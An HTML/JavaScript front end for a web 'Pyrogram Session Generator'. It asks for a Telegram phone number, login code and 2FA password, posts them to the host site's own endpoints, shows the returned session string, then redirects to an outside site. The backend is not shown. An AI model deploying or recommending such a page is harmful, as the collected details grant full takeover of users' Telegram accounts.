<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pyrogram Session Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #050505;
            --card-bg: #101010;
            --accent: #0088cc; /* Telegram Blue */
            --accent-glow: rgba(0, 136, 204, 0.4);
            --text: #ffffff;
            --text-sec: #aaaaaa;
            --success: #238636;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text);
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Background Animation */
        .bg-effect {
            position: absolute;
            width: 300px;
            height: 300px;
            background: var(--accent);
            filter: blur(150px);
            opacity: 0.2;
            border-radius: 50%;
            z-index: -1;
            animation: breathe 6s infinite alternate;
        }

        @keyframes breathe {
            0% { transform: scale(1); opacity: 0.2; }
            100% { transform: scale(1.2); opacity: 0.3; }
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* Steps Animation */
        .step {
            background: var(--card-bg);
            padding: 30px;
            border-radius: 20px;
            border: 1px solid #222;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            text-align: center;
            display: none; /* Hidden by default */
            animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .step.active {
            display: block;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h1 { font-weight: 600; margin-bottom: 5px; }
        p { color: var(--text-sec); font-size: 14px; margin-bottom: 25px; }

        input {
            width: 100%;
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 15px;
            color: white;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            box-sizing: border-box;
            outline: none;
            text-align: center;
            transition: 0.3s;
        }

        input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 15px var(--accent-glow);
        }

        button {
            width: 100%;
            padding: 15px;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #0099e6;
            transform: scale(1.02);
        }

        .loader {
            display: none;
            margin: 10px auto;
            border: 3px solid #333;
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Result Area */
        textarea {
            width: 100%;
            height: 100px;
            background: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            resize: none;
            margin-bottom: 10px;
        }

        .copy-btn {
            background: #222;
            border: 1px solid #333;
        }
        .copy-btn:hover { background: #333; }

        .logo { font-size: 40px; margin-bottom: 10px; display: block; }

        /* --- REDIRECT MODAL --- */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(8px);
            animation: fadeIn 0.3s;
        }

        .modal-box {
            background: #161b22;
            padding: 40px;
            border-radius: 16px;
            border: 1px solid #333;
            text-align: center;
            width: 90%;
            max-width: 350px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
            transform: scale(0.9);
            animation: popIn 0.3s forwards;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popIn { 
            from { transform: scale(0.9); opacity: 0; } 
            to { transform: scale(1); opacity: 1; } 
        }

        .modal-icon {
            font-size: 50px;
            margin-bottom: 15px;
            display: block;
        }

        .modal-btn {
            background-color: var(--success);
            margin-top: 20px;
        }
        .modal-btn:hover { background-color: #2ea043; }

    </style>
</head>
<body>

    <div class="bg-effect"></div>

    <div class="container">

        <div id="step1" class="step active">
            <span class="logo">‚ö°</span>
            <h1>Pyrogram Session</h1>
            <p>Securely generate your string session.</p>
            
            <input type="text" id="phone" placeholder="+91 9999999999">
            <button onclick="sendOTP()" id="btn1">Send OTP üöÄ</button>
            <div class="loader" id="load1"></div>
        </div>

        <div id="step2" class="step">
            <span class="logo">üì©</span>
            <h1>Enter OTP</h1>
            <p>Check your Telegram app for the code.</p>
            
            <input type="text" id="otp" placeholder="1 2 3 4 5">
            <button onclick="verifyOTP()" id="btn2">Verify OTP üîê</button>
            <div class="loader" id="load2"></div>
        </div>

        <div id="step3" class="step">
            <span class="logo">üîë</span>
            <h1>2FA Password</h1>
            <p>Your account is protected with a password.</p>
            
            <input type="password" id="password" placeholder="Enter your 2FA password">
            <button onclick="verifyPassword()" id="btn3">Unlock & Generate üîì</button>
            <div class="loader" id="load3"></div>
        </div>

        <div id="step4" class="step">
            <span class="logo">‚úÖ</span>
            <h1>Session Generated!</h1>
            <p>Click below to copy your string.</p>
            
            <textarea id="sessionString" readonly></textarea>
            <button onclick="copyString()" class="copy-btn" id="copyBtn">Copy String üìã</button>
        </div>

    </div>

    <div id="redirectModal" class="modal-overlay">
        <div class="modal-box">
            <span class="modal-icon">üéâ</span>
            <h2 style="margin: 0 0 10px 0;">Copied!</h2>
            <p style="color: #aaa; margin-bottom: 20px;">String copy ho gaya hai. Ab wapas jakar ise paste karein.</p>
            <button class="modal-btn" onclick="goBackToMain()">Go Back & Paste ‚Ü™Ô∏è</button>
        </div>
    </div>

    <script>
        let phoneHash = "";
        let phoneNumber = "";

        // --- Step 1: Send OTP ---
        async function sendOTP() {
            phoneNumber = document.getElementById('phone').value;
            if(!phoneNumber) return alert("Please enter phone number!");

            setLoading(1, true);

            try {
                const res = await fetch('/send_otp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phoneNumber })
                });
                const data = await res.json();

                if(data.status === 'success') {
                    phoneHash = data.hash;
                    switchStep(1, 2);
                } else {
                    alert("Error: " + data.message);
                }
            } catch(e) { alert("Server Error"); }
            
            setLoading(1, false);
        }

        // --- Step 2: Verify OTP ---
        async function verifyOTP() {
            const code = document.getElementById('otp').value;
            if(!code) return alert("Enter OTP!");

            setLoading(2, true);

            try {
                const res = await fetch('/verify_otp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        phone: phoneNumber, 
                        code: code, 
                        hash: phoneHash 
                    })
                });
                const data = await res.json();

                if(data.status === 'success') {
                    showSuccess(data.session);
                } else if (data.status === '2fa_required') {
                    switchStep(2, 3);
                } else {
                    alert("Error: " + data.message);
                }
            } catch(e) { alert("Server Error"); }
            
            setLoading(2, false);
        }

        // --- Step 3: Verify Password (If 2FA) ---
        async function verifyPassword() {
            const password = document.getElementById('password').value;
            const code = document.getElementById('otp').value;
            
            setLoading(3, true);

            try {
                const res = await fetch('/verify_password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        phone: phoneNumber, 
                        code: code, 
                        hash: phoneHash,
                        password: password
                    })
                });
                const data = await res.json();

                if(data.status === 'success') {
                    showSuccess(data.session);
                } else {
                    alert("Error: " + data.message);
                }
            } catch(e) { alert("Server Error"); }
            
            setLoading(3, false);
        }

        // --- Helpers ---
        function switchStep(from, to) {
            document.getElementById('step'+from).classList.remove('active');
            setTimeout(() => {
                document.getElementById('step'+to).classList.add('active');
            }, 100);
        }

        function setLoading(step, isLoading) {
            document.getElementById('btn'+step).style.display = isLoading ? 'none' : 'block';
            document.getElementById('load'+step).style.display = isLoading ? 'block' : 'none';
        }

        function showSuccess(session) {
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById('step4').classList.add('active');
            document.getElementById('sessionString').value = session;
        }

        function copyString() {
            const copyText = document.getElementById("sessionString");
            copyText.select();
            copyText.setSelectionRange(0, 99999); // Mobile fix
            
            try {
                navigator.clipboard.writeText(copyText.value);
            } catch (err) {
                document.execCommand("copy");
            }

            const btn = document.getElementById("copyBtn");
            btn.innerText = "Copied! üéâ";
            btn.style.background = "#238636";
            
            // SHOW POPUP AFTER COPYING
            setTimeout(() => {
                document.getElementById('redirectModal').style.display = 'flex';
            }, 500);
        }

        function goBackToMain() {
            // Redirect to the main tool
            window.location.href = "https://nevgan.vercel.app/";
        }
    </script>
</body>
</html>
